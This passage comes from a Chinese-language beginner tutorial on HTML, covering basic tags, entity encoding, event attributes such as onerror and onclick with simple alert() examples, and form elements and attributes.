Text3、Notepad++、vsCode</p><p>（2）在线编辑器：</p><ul><li><a href="https://www.jq22.com/webide/">https://www.jq22.com/webide/</a></li><li><a href="https://www.w3school.com.cn/tiy/t.asp">https://www.w3school.com.cn/tiy/t.asp</a></li><li><a href="https://c.runoob.com/front-end/61">https://c.runoob.com/front-end/61</a></li></ul><p>（3）VScode快捷键：Ctrl+/  注释、Tab   补全、Alt+B  运行。</p><h3 id="HTML基本概念"><a href="#HTML基本概念" class="headerlink" title="HTML基本概念"></a>HTML基本概念</h3><p>（1）HTML指的是超文本标记语言(Hyper Text Markup Language)</p><p>（2）HTML不是一种编程语言，而是一种标记语言(Markup Language)，标记语言是一套标记标签(Markup Tag)</p><p>（3）HTML使用标记标签来描述网页</p><p>（4）HTML标签是由尖括号包围的关键词，比如&lt;html&gt;</p><p>（5）<strong>HTML标签通常是成对出现的</strong>，比如&lt;b&gt;和&lt;/b&gt;</p><p>（6）<strong>标签对中第一个标签是开始标签，第二个标签是结束标签</strong></p><p>（7）开始标签和结束标签也被称为开放标签和闭合标签</p><p>（8）<strong>编写HTML时，不会出现报错信息，并且具有自动纠错功能。</strong></p><p>PS:<strong>HTML文档通常用htm和html作为后缀名。Web浏览器的作用是读取HTML文档，并以网页的形式显示出他们。浏览器不会显示HTML标签，而是使用标签来解释页面的内容。</strong></p><h3 id="HTML元素"><a href="#HTML元素" class="headerlink" title="HTML元素"></a>HTML元素</h3><p>（1）HTML元素指的是从开始标签(start tag)，到结束标签(end tag)的所有代码。</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;a href=&quot;index.html&quot;&gt;首页&lt;/a&gt;        &lt;br&gt;    &lt;/body&gt;&lt;/html&gt;&lt;!-- 上述HTML代码中，html元素中嵌套了body元素，body元素中又嵌套了a元素和br元素 --&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/ahLjpODg9TUnw6I.png" alt="image-20201216201051807"></p><p>（2）HTML元素语法</p><ul><li><p>HTML元素以开始标签(start tag)起始，以结束标签(end tag)终止</p></li><li><p>元素的内容是开始标签与结束标签之间的内容</p></li><li><p>某些HTML元素内容为空，空元素在开始标签中闭合，无结束标签</p></li><li><p>大多数HTML元素可拥有属性，属性总是以名称/值对的形式出现，提供了有关HTML元素的更多信息。</p><p>属性总是在HTML元素的开始标签中规定；属性值应该始终被包括在引号内，双引号是最常用的，不过使用单引号也没问题。</p></li></ul><p>（3）嵌套的HTML元素</p><ul><li>大多数HTML元素可以嵌套(可以包含其他HTML元素)</li><li>HTML文档由嵌套的HTML元素构成</li></ul><p>（4）空的HTML元素</p><ul><li>没有内容的HTML元素被称为空元素。空元素是在开始标签中关闭的。</li><li>&lt;br /&gt;就是没有关闭标签的空元素(&lt;br /&gt;标签定义换行)</li></ul><h3 id="常见的HTML标签"><a href="#常见的HTML标签" class="headerlink" title="常见的HTML标签"></a>常见的HTML标签</h3><p>行标签、块标签、行列块标签</p><p>（1）基础标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;!DOCTYPE&gt;</td><td align="center">定义文档类型</td></tr><tr><td align="center">&lt;html&gt;</td><td align="center">定义HTML文档</td></tr><tr><td align="center">&lt;body&gt;</td><td align="center">定义文档的主体</td></tr><tr><td align="center">&lt;head&gt;</td><td align="center">定义关于文档的信息，默认换行</td></tr><tr><td align="center">&lt;meta&gt;</td><td align="center">定义关于HTML文档的元信息</td></tr><tr><td align="center">&lt;title&gt;</td><td align="center">定义文档的题目</td></tr><tr><td align="center">&lt;script&gt;</td><td align="center">定义客户端脚本，元素内容编写js代码</td></tr><tr><td align="center">&lt;style&gt;</td><td align="center">元素内容编写css代码</td></tr></tbody></table><p>（2）多媒体标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>&lt;img&gt;</strong></td><td align="center"><strong>定义图像</strong></td></tr><tr><td align="center">&lt;audio&gt;</td><td align="center">定义声音内容</td></tr><tr><td align="center">&lt;video&gt;</td><td align="center">定义视频</td></tr></tbody></table><pre><code class="html">&lt;img src=&quot;&quot;  alt=&quot;&quot;&gt;test&lt;/img&gt;&lt;audio src=&quot;&quot; controls&gt;&lt;/audio&gt;&lt;video src=&quot;&quot; controls&gt;&lt;/video&gt;&lt;!-- src和href表示资源路径，如果无法显示图片，浏览器将显示代替文本，即alt的值。controls代表显示控件，可以让用户手动播放音频和视频--&gt;</code></pre><p>（3）表单标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>&lt;form&gt;</strong></td><td align="center"><strong>定义供用户输入的HTML表单</strong></td></tr><tr><td align="center"><strong>&lt;input&gt;</strong></td><td align="center"><strong>定义输入控件(一个输入框)</strong></td></tr><tr><td align="center"><strong>&lt;textarea&gt;</strong></td><td align="center">定义多行的文本输入控件(一个大的多行输入框)</td></tr><tr><td align="center"><strong>&lt;button&gt;</strong></td><td align="center">定义按钮</td></tr><tr><td align="center"><strong>&lt;select&gt;</strong></td><td align="center">定义选择列表(下拉列表)</td></tr><tr><td align="center"><strong>&lt;optgroup&gt;</strong></td><td align="center">定义选择列表中的相关选项的组合</td></tr><tr><td align="center"><strong>&lt;option&gt;</strong></td><td align="center">定义选择列表中的选项</td></tr><tr><td align="center">&lt;fieldset&gt;</td><td align="center">定义围绕表单中元素的边框</td></tr><tr><td align="center">&lt;datalist&gt;</td><td align="center">定义下拉列表</td></tr></tbody></table><pre><code class="html">&lt;html&gt;    &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;/head&gt;&lt;form action=&quot;1.php&quot; method=&quot;GET&quot;&gt;     &lt;h1&gt;个人信息填写&lt;/h1&gt;    &lt;!-- action表示将表单提交到哪里，method表示提交的方法(GET或POST)--&gt;    性别：    &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;男    &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;&gt;女    &lt;!-- input定义一个输入框，根据type值的不同有不同的输入方式和内容。常用的type的值有：number(数字)text(文本)、date(日期)、email(邮件)、password(密码)、radio(单选框)、checkbox(复选框)。当参数名称name的值相同时，单选框只能选择一个，提交表单时提交value对应的值。--&gt;    &lt;br/&gt;    爱好：    &lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot;&gt;运动    &lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot;&gt;漫画    &lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot;&gt;游戏    &lt;br/&gt;    城市：    &lt;!-- 下拉框--&gt;    &lt;select name=&quot;&quot; id=&quot;&quot;&gt;        &lt;optgroup&gt;            &lt;option value=&quot;厦门&quot;&gt;厦门&lt;/option&gt;            &lt;option value=&quot;福州&quot;&gt;福州&lt;/option&gt;            &lt;option value=&quot;泉州&quot;&gt;泉州&lt;/option&gt;        &lt;/optgroup&gt;        &lt;br/&gt;        &lt;optgroup&gt;            &lt;option value=&quot;成都&quot;&gt;成都&lt;/option&gt;        &lt;/optgroup&gt;    &lt;/select&gt;    &lt;br/&gt;    个人描述：    &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;500&quot; sytle=&quot;resize:none;&quot;&gt;&lt;/textarea&gt;    &lt;!-- cols表示列数，rows表示行数，浏览器显示时可随意拉伸该文本框,resize:none;表示禁止拉伸--&gt;    &lt;br/&gt;    &lt;input type=&quot;submit&quot; /&gt; &lt;!--一般用于提交表单，而不是botton标签，button一般放在form标签外面--&gt;    &lt;input type=&quot;reset&quot; /&gt; &lt;!--重置表单的所有数据--&gt;&lt;/form&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/21/3S2o5Fri9BMVU7f.png" alt="image-20210321093128668"></p><p>（4）链接标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>&lt;a&gt;</strong></td><td align="center"><strong>定义超链接</strong></td></tr><tr><td align="center"><strong>&lt;link&gt;</strong></td><td align="center">定义文档与外部资源的关系</td></tr></tbody></table><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;demo.css&quot;/&gt;&lt;!-- 在编写HTML代码时，可用用link标签引入css文件。href表示css文件的存放位置，URL。若HTML文件和css文件在同一个目录下，href值如上 --&gt;</code></pre><p>（5）格式标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>&lt;h1&gt;to&lt;h6&gt;</strong></td><td align="center"><strong>定义HTML标题</strong></td></tr><tr><td align="center"><strong>&lt;p&gt;</strong></td><td align="center"><strong>定义段落,默认在前后存在换行</strong></td></tr><tr><td align="center"><strong>&lt;br&gt;</strong></td><td align="center"><strong>定义换行</strong></td></tr><tr><td align="center">&lt;hr&gt;</td><td align="center">定义水平线</td></tr><tr><td align="center">&lt;b&gt;</td><td align="center">定义粗体文本</td></tr><tr><td align="center">&lt;big&gt;</td><td align="center">定义大号文本</td></tr><tr><td align="center">&lt;em&gt;</td><td align="center">定义强调文本</td></tr><tr><td align="center">&lt;i&gt;</td><td align="center">定义斜体文本</td></tr><tr><td align="center">&lt;pre&gt;</td><td align="center">定义预格式文本</td></tr><tr><td align="center">&lt;small&gt;</td><td align="center">定义小号文本</td></tr><tr><td align="center">&lt;font&gt;</td><td align="center">定义文本的字体大小和颜色</td></tr></tbody></table><pre><code class="html">&lt;hr color=&quot;red&quot; width=&quot;500px&quot; align=&quot;left&quot;&gt;&lt;!-- 水平线宽度为500像素，向左居中--&gt;&lt;font color=&quot;red&quot; size=&quot;18px&quot;&gt;文本&lt;/font&gt;&lt;!-- px为像素单位--&gt;</code></pre><p>（6）样式/节标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>&lt;style&gt;</strong></td><td align="center"><strong>定义文档的样式信息</strong></td></tr><tr><td align="center"><strong>&lt;div&gt;</strong></td><td align="center"><strong>定义文档中的分隔区块</strong></td></tr><tr><td align="center">&lt;span&gt;</td><td align="center">定义文档中的节</td></tr></tbody></table><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;div class=&quot;&quot; style=&quot;&quot;&gt;  &lt;!-- div作为一个块级元素，默认会占满一整行因此有换行的效果，但严格意义上说并不是换行，可以通过width，height，float等属性修改块的大小使之没有换行效果。独立成块，看成是一个容器，可在其中添加文字、图片、超链接等--&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（7）表格标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;table&gt;</td><td align="center">定义表格</td></tr><tr><td align="center">&lt;caption&gt;</td><td align="center">定义表格标题</td></tr><tr><td align="center">&lt;th&gt;</td><td align="center">定义表格中的表头单元格</td></tr><tr><td align="center">&lt;td&gt;</td><td align="center">定义表格中的单元格（列）</td></tr><tr><td align="center">&lt;tr&gt;</td><td align="center">定义表格中的行</td></tr></tbody></table><p>tr：表示表格中的一行，特点：存在N个tr，则会在表格中出现N行</p><p>td：表示一行中的一个单元格，特点：存在N个td，则会在该行中出现N个单元格</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;50&quot; border-collapse:collapse&gt; &lt;!-- border表示设置边框的宽度，cellspacing表示外边距,为0则隐藏了外边距但还存在。cellpadding设置表格的内边距。border-collapse：属性，为表格设置合并边框模型。其属性值如下：separate：默认值。边框会被分开。collapse：将边框会合并为一个单线的边框--&gt;            &lt;!--创建一个5行5列的表格,存在5个tr，25个td--&gt;           &lt;caption&gt;Security&lt;/caption&gt; &lt;!--表格标题，在表格的上方居中显示--&gt;            &lt;tr&gt;               &lt;th&gt;test1&lt;/th&gt;      &lt;!-- th表示表头单元格,有加粗--&gt;               &lt;th&gt;test2&lt;/th&gt;               &lt;th&gt;test3&lt;/th&gt;               &lt;th&gt;test4&lt;/th&gt;               &lt;th&gt;test5&lt;/th&gt;           &lt;/tr&gt;            &lt;tr&gt;               &lt;td&gt;1&lt;/td&gt;               &lt;td&gt;1&lt;/td&gt;               &lt;td&gt;1&lt;/td&gt;               &lt;td&gt;1&lt;/td&gt;               &lt;td&gt;1&lt;/td&gt;           &lt;/tr&gt;         &lt;/tabel&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（8）框架标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;frame&gt;</td><td align="center">定义框架集的窗口或框架</td></tr><tr><td align="center">&lt;frameset&gt;</td><td align="center">定义框架集</td></tr><tr><td align="center"><strong>&lt;iframe&gt;</strong></td><td align="center"><strong>定义内联框架</strong></td></tr></tbody></table><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;style&gt;            iframe&#123;            &#125;        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;iframe src=&quot;&quot; frameborder=&quot;0&quot; width=&quot;1000px&quot;  height=&quot;100%&quot;&gt;              &lt;!--iframe 内联框架，块级元素，有宽度和高度,可以在当前网页内引入另一个网页的资源,可加载并显示其他网页的内容,frameborder=0表示关闭边框，为1显示边框。高度和宽度值设置为100%表示占满全屏 --&gt;        &lt;/iframe&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>参考链接:<a href="https://www.w3school.com.cn/tags/index.asp">https://www.w3school.com.cn/tags/index.asp</a></p><h3 id="HTML注释"><a href="#HTML注释" class="headerlink" title="HTML注释"></a>HTML注释</h3><p>（1）注释标签&lt;!– 与 –&gt; 用于在HTML插入注释</p><pre><code class="html">&lt;!-- 在此处写注释 --&gt;</code></pre><p>（2）注释：在开始标签中有一个惊叹号，但是结束标签中没有。</p><p>（3）浏览器不会显示注释，但是能够帮助记录HTML文档。</p><p>（4）可以利用注释在HTML中放置通知和提醒信息。</p><h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>（1）HTML实体编码，也即HTML中的转义字符</p><ul><li>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。</li><li>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</li><li>字符实体类似：&entity_name;或者&#entity_number;</li></ul><p>（2）如需显示小于号，我们必须这样写：&amp;lt; 或 &amp;#60;</p><p>（3）使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（对实体数字的支持却很好）。</p><p>（4）常见的实体编码，参考链接：<a href="https://www.w3school.com.cn/html/html_entities.asp">https://www.w3school.com.cn/html/html_entities.asp</a></p><table><thead><tr><th align="left">显示结果</th><th align="left">描述</th><th align="left">实体名称</th><th align="left">实体编号</th></tr></thead><tbody><tr><td align="left"></td><td align="left">空格</td><td align="left">&amp;nbsp;</td><td align="left">&amp;#160;</td></tr><tr><td align="left">&lt;</td><td align="left">小于号</td><td align="left">&amp;lt;</td><td align="left">&amp;#60;</td></tr><tr><td align="left">&gt;</td><td align="left">大于号</td><td align="left">&amp;gt;</td><td align="left">&amp;#62;</td></tr><tr><td align="left">&amp;</td><td align="left">和号</td><td align="left">&amp;amp;</td><td align="left">&amp;#38;</td></tr><tr><td align="left">“</td><td align="left">引号</td><td align="left">&amp;quot;</td><td align="left">&amp;#34;</td></tr><tr><td align="left">‘</td><td align="left">撇号</td><td align="left">&amp;apos; (IE不支持)</td><td align="left">&amp;#39;</td></tr><tr><td align="left">©</td><td align="left">版权（copyright）</td><td align="left">&amp;copy;</td><td align="left">&amp;#169;</td></tr></tbody></table><p>（5）HTML属性–全局属性</p><p>全局属性是可用于为任何HTML元素赋予意义和语境的属性。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">class</td><td align="center">规定元素的一个或多个类名(引用样式表中的类)</td></tr><tr><td align="center">hidden</td><td align="center">规定元素进行隐藏</td></tr><tr><td align="center">id</td><td align="center">规定元素的唯一id</td></tr><tr><td align="center">style</td><td align="center">规定元素的行内CSS样式</td></tr><tr><td align="center">title</td><td align="center">规定有关元素的额外信息</td></tr><tr><td align="center">data-*</td><td align="center">路由。用于存储页面或应用程序的私有定制数据</td></tr></tbody></table><p>ps：id、class方便使用css和JavaScript控制对应的元素，id是唯一的，class是对应一个类</p><h2 id="HTML事件属性"><a href="#HTML事件属性" class="headerlink" title="HTML事件属性"></a>HTML事件属性</h2><p>（1）事件型属性是可以使HTML事件触发浏览器中的行为，比方说当用户点击某个HTML元素时启动一段JavaScript。</p><p>（2）事件型属性通常可以分为：全局事件属性，窗口事件属性，表单事件属性，键盘事件属性，鼠标事件属性，多媒体事件属性，其他事件属性。</p><h3 id="Window事件属性—onerror事件"><a href="#Window事件属性—onerror事件" class="headerlink" title="Window事件属性—onerror事件"></a>Window事件属性—onerror事件</h3><p>（1）onerror：在错误发生时运行的脚本。</p><p>（2）定义和用法：</p><ul><li>onerror事件会在文档或图像加载过程中发生错误时被触发。</li><li>在装载文档或图像的过程中如果发生了错误，就会调用该事件句柄。</li></ul><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;!-- onerror 事件会在文档或图像加载过程中发生错误时被触发。--&gt;        &lt;img src=&quot;image.gif&quot;             onerror=&quot;alert(&#39;The image could not be loaded.&#39;)&quot; /&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/EOgsuHUzaYPecBd.png" alt="image-20210315165838173"></p><h3 id="Window事件属性—onload事件"><a href="#Window事件属性—onload事件" class="headerlink" title="Window事件属性—onload事件"></a>Window事件属性—onload事件</h3><p>（1）onload：页面结束加载之后触发。</p><p>（2）定义和用法：</p><ul><li>onload属性在对象已加载时触发。</li><li>onload常用在&lt;body&gt;中，一旦完全加载所有内容(包括图像、脚本文件、CSS文件等)，就执行一段脚本。</li></ul><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body onload=&quot;alert(&#39;该页面已加载！&#39;)&quot;&gt;        &lt;h1&gt;            Hello World!        &lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/86aqodCfvhipGBl.png" alt="image-20210315180956314"></p><h3 id="Form事件属性—onchange事件"><a href="#Form事件属性—onchange事件" class="headerlink" title="Form事件属性—onchange事件"></a>Form事件属性—onchange事件</h3><p>（1）onchange：在元素值被改变时运行的脚本。</p><p>（2）定义和用法：</p><ul><li>onchange事件会在域的内容改变时发生。</li><li>onchange事件也可用于单选框与复选框改变后触发的事件</li><li>onchange属性适用于：&lt;input&gt;、&lt;textarea&gt;以及&lt;select&gt;元素。</li></ul><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;script&gt;            function myFunction()&#123;                var x=document.getElementById(&quot;fname&quot;);                x.value=x.value.toUpperCase();            &#125;        &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        输入你的名字：&lt;input type=&quot;text&quot; id=&quot;fname&quot; onchange=&quot;myFunction()&quot;&gt;        &lt;!--当你离开输入框后，函数将被触发，将小写字母转变为大写字母--&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/nmSdzCarPgTRs1q.png" alt="image-20210315181941724"></p><p><img src="https://i.loli.net/2021/03/15/2olfHGX8RTmL3wS.png" alt="image-20210315181959113"></p><h3 id="Form事件属性—onfocus事件"><a href="#Form事件属性—onfocus事件" class="headerlink" title="Form事件属性—onfocus事件"></a>Form事件属性—onfocus事件</h3><p>（1）onfocus：当元素获得焦点时运行的脚本。</p><p>（2）定义和用法：</p><ul><li>onfocus属性在元素获得焦点时触发</li><li>onfocus常用于&lt;input&gt;、&lt;select&gt;以及&lt;a&gt;</li></ul><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;script&gt;            function myFunction(x)&#123;                x.style.background=&quot;yellow&quot;;            &#125;        &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        输入你的名字：&lt;input type=&quot;text&quot; onfocus=&quot;myFunction(this)&quot;&gt;        &lt;!--当输入框获取焦点时，修改背景色将被触发--&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/1G263yPbEOo8qfe.png" alt="image-20210315182624985"></p><p><img src="https://i.loli.net/2021/03/15/vk34qrVUO8FSlwB.png" alt="image-20210315182637474"></p><h3 id="Mouse事件属性—onclick事件"><a href="#Mouse事件属性—onclick事件" class="headerlink" title="Mouse事件属性—onclick事件"></a>Mouse事件属性—onclick事件</h3><p>onclick：元素上发生鼠标点击时触发。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;script&gt;            function myFunction()&#123;                document.getElementById(&quot;demo&quot;).innerHTML=&quot;Hello World&quot;;            &#125;        &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;button onclick=&quot;myFunction()&quot;&gt;            点我        &lt;/button&gt;        &lt;p id=&quot;demo&quot;&gt;        &lt;/p&gt;        &lt;!-- 点击将触发onclick事件 --&gt;        &lt;button onclick=&quot;window.location.href=&#39;http:\/\/127.0.0.1&#39;&quot;&gt;            填写个人信息        &lt;/button&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/OsY4WdJU2cRVurM.png" alt="image-20210315184435547"></p><h3 id="Mouse事件属性—onmousemove事件"><a href="#Mouse事件属性—onmousemove事件" class="headerlink" title="Mouse事件属性—onmousemove事件"></a>Mouse事件属性—onmousemove事件</h3><p>onmouseover：当鼠标指针移动到元素时触发</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;input onmousemove=&quot;alert(&#39;The event has been triggered&#39;)&quot;&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/4iME3hV2CygcuX1.png" alt="image-20210315185221847"></p><h3 id="Mouse事件属性—onmouseover事件"><a href="#Mouse事件属性—onmouseover事件" class="headerlink" title="Mouse事件属性—onmouseover事件"></a>Mouse事件属性—onmouseover事件</h3><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;h1 onmouseover=&quot;alert(&#39;The event has been triggered&#39;)&quot;&gt;hanker&lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/wAdP5poI19yfmJF.png" alt="image-20210315185526053"></p><h3 id="HTML列表"><a href="#HTML列表" class="headerlink" title="HTML列表"></a>HTML列表</h3><p>HTML支持有序、无序列表</p><p>（1）定义无序列表：ul+li</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;ul&gt;            &lt;li&gt;咖啡&lt;/li&gt;            &lt;li&gt;茶&lt;/li&gt;            &lt;li&gt;牛奶&lt;/li&gt;        &lt;/ul&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/vtYNhQykP7JHfWM.png" alt="image-20210315190107145"></p><p>（2）定义有序列表：ol+li</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;ol&gt;            &lt;li&gt;咖啡&lt;/li&gt;            &lt;li&gt;茶&lt;/li&gt;            &lt;li&gt;牛奶&lt;/li&gt;        &lt;/ol&gt;        &lt;ol start=&quot;50&quot;&gt;           &lt;li&gt;咖啡&lt;/li&gt;           &lt;li&gt;茶&lt;/li&gt;           &lt;li&gt;牛奶&lt;/li&gt;         &lt;/ol&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/RFi12fZT4vWtKUb.png" alt="image-20210315190327677"></p><h3 id="HTML表单"><a href="#HTML表单" class="headerlink" title="HTML表单"></a>HTML表单</h3><p>（1）HTML表单用于搜集不同类型的用户输入</p><p>（2）&lt;form&gt;元素</p><ul><li>HTML表单用于收集用户输入</li></ul><p>（3）HTML表单包含表单元素。</p><ul><li>表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等。</li></ul><p>（4）&lt;input&gt;元素是最重要的表单元素</p><p>（5）&lt;input&gt;元素有很多形态，根据不同的type属性。</p><table><thead><tr><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">text</td><td align="center">定义常规文本输入</td></tr><tr><td align="center">radio</td><td align="center">定义单选按钮输入（选择多个选择之一）</td></tr><tr><td align="center">submit</td><td align="center">定义提交按钮（提交表单）</td></tr></tbody></table><h4 id="文本输入"><a href="#文本输入" class="headerlink" title="文本输入"></a>文本输入</h4><p>&lt;input type=”text”&gt;定义用于文本输入的单行输入字段</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot;/&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;/&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/bpMRWlGhvE3J9jU.png" alt="image-20210315191807882"></p><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p>（1）&lt;input type=”radio”&gt;定义单选按钮</p><p>（2）单选按钮允许用户在有限数量的选项中选择其中之一。</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;/&gt;Male            &lt;br&gt;            &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;/&gt;Female        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/c3WLbOfRqaQTGnv.png" alt="image-20210315192243280"></p><h4 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h4><p>（1）&lt;input type=”submit”&gt;定义用于向表单处理程序提交表单的按钮</p><p>（2）表单处理程序通常是包含用来处理输入数据的脚本的服务器页面</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form action=&#39;form.php&#39;&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot;/&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;/&gt;            &lt;br&gt;            &lt;input type=&quot;submit&quot; value=&quot;submit&quot;/&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/uWx9OeFcNGq3bHM.png" alt="image-20210315192941921"></p><p><img src="https://i.loli.net/2021/03/15/UnsfAECtjNOgGla.png" alt="image-20210315193009434"></p><h4 id="各种框总结"><a href="#各种框总结" class="headerlink" title="各种框总结"></a>各种框总结</h4><ul><li>文本框：text</li><li>隐藏文本框：hidden</li><li>密码框：password</li><li>多选框：checkbox</li><li>单选框：radio</li><li>提交按钮：submit</li><li>重置按钮：reset</li><li>多选框：select、option</li></ul><h4 id="action属性"><a href="#action属性" class="headerlink" title="action属性"></a>action属性</h4><p>（1）action属性定义在提交表单时执行的动作</p><p>（2）向服务器提交表单通常做法是使用提交按钮</p><p>（3）通常，表单会被提交到web服务器上的网页</p><pre><code class="html">&lt;form action=&quot;action_page.php&quot;&gt;</code></pre><p>（4）如果省略action属性，则action会被设置为当前页面</p><h4 id="method属性"><a href="#method属性" class="headerlink" title="method属性"></a>method属性</h4><p>（1）method属性规定在提交表单时所用的HTTP方法(GET或POST)</p><pre><code class="html">&lt;form action=&quot;action_page.php&quot; method=&quot;GET&quot;&gt;&lt;form action=&quot;action_page.php&quot; method=&quot;POST&quot;&gt;</code></pre><p>（2）如果表单提交是被动的（比如搜索引擎查询），并且没有敏感信息。表单数据在页面地址栏是可见的。这时使用GET.</p><pre><code>action_page.php?firstname=Mickey&amp;lastname=Mouse</code></pre><p>（3）如果表单正在更新数据，或者包含敏感信息(例如密码）。POST的安全性更佳，因为在页面地址栏中被提交的数据是不可见的。</p><h4 id="校验函数"><a href="#校验函数" class="headerlink" title="校验函数"></a>校验函数</h4><p>onsubmit事件在表单提交时触发，当检验不通过时，就不会提交表单内容。</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;login&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h3&gt;            Login Please        &lt;/h3&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            function check()&#123;                alert(&quot;check函数被触发了~&quot;)                return true   //此处改为false就不会提交，会返回false            &#125;        &lt;/script&gt;        &lt;form action=&quot;/login.php&quot; method=&quot;post&quot; onsubmit=&quot;return check()&quot;&gt;            姓名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;            密码：&lt;input type=&quot;text&quot; password=&quot;password&quot;&gt;&lt;br&gt;            &lt;input value=&quot;提交&quot; type=&quot;submit&quot; name=&quot;submit&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/Y1lJreIVGRN7zKo.png" alt="image-20210315203458505"></p><h3 id="HTML的form属性"><a href="#HTML的form属性" class="headerlink" title="HTML的form属性"></a>HTML的form属性</h3><p><img src="https://i.loli.net/2021/03/15/1jKqzZuAaE8GdsX.png" alt="image-20210315194714650"></p><h3 id="常见的输入限制"><a href="#常见的输入限制" 